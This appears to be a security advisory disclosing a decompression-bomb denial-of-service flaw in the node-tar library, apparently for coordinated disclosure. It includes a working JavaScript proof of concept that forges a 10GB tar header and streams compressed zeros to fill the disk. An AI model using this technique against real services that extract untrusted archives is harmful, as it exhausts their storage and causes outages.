summary: "node-tar: Decompression/parse DoS via unlimited input\n### Summary\nA **Decompression/parse\
  \ DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server\
  \ resources (disk space and CPU). Because the library does not enforce hard upper bounds on\
  \ total decompressed data or entry counts, a small, maliciously crafted \"Gzip Bomb\" can\
  \ be used to fill a server's storage and crash services.\n\n### Details\nThe `node-tar` library\
  \ does not enforce a hard upper bound on archive size or the volume of decompressed data processed\
  \ during extraction. While the `maxReadSize` option exists, it only controls internal read\
  \ chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\n\
  \nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive.\
  \ There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker\
  \ can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly\
  \ compressible data (like zeros). `node-tar` will continue to extract and write this data\
  \ until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource\
  \ consumption.\n\n### PoC\nThe following Proof of Concept demonstrates how a tiny compressed\
  \ input can be expanded into gigabytes of data on the host machine almost instantly.\n\n1.\
  \ Create the exploit script:\n```javascript\nconst fs = require('fs'), z = require('zlib'),\
  \ t = require('tar');\n\nconst d = 'dos_test';\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\n\
  fs.mkdirSync(d);\n\n// Build 10GB header\nconst h = Buffer.alloc(512);\nh.write('payload');\n\
  h.write((10*1024**3).toString(8).padStart(11,'0'), 124); \nh.write('ustar', 257);\nlet s =\
  \ 256;\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\nh.write(s.toString(8).padStart(6,'0'),\
  \ 148);\n\nconst gz = z.createGzip();\ngz.pipe(t.x({cwd: d}));\ngz.write(h);\n\nconst b =\
  \ Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\n\nconst run = () => {\n  while\
  \ (gz.write(b));\n  gz.once('drain', run);\n};\n\nconst monitor = setInterval(() => {\n  \
  \  try {\n        const bytes = fs.statSync(`${d}/payload`).size;\n        const mb = Math.floor(bytes\
  \ / (1024 * 1024));\n        process.stdout.write(`\\r[>] Extracted: ${mb} MB`);\n       \
  \ \n        if (mb > 5000) { \n            console.log('\\n[!] VULN CONFIRMED: 5GB+ written\
  \ from tiny input.'); \n            process.exit(); \n        }\n    } catch {}\n}, 50);\n\
  \nprocess.on('exit', () => {\n    clearInterval(monitor);\n    console.log('[*] Cleaning up...');\n\
  \    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\n});\n\nrun();\n```\n\
  \n2. Run the PoC:\n```bash\nnode poc.js\n```\n\n**Observation:** You will see the extracted\
  \ size rapidly climb to 5,000 MB+ within seconds, while the actual data being \"sent\" through\
  \ the gzip stream is negligible.\n\n### Impact\nThis is a **Denial of Service (DoS)** vulnerability.\
  \ It impacts any application or service that uses `node-tar` to extract archives provided\
  \ by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An\
  \ unauthenticated attacker can send a small payload that expands to consume all available\
  \ disk space, leading to system-wide failure and service outages."
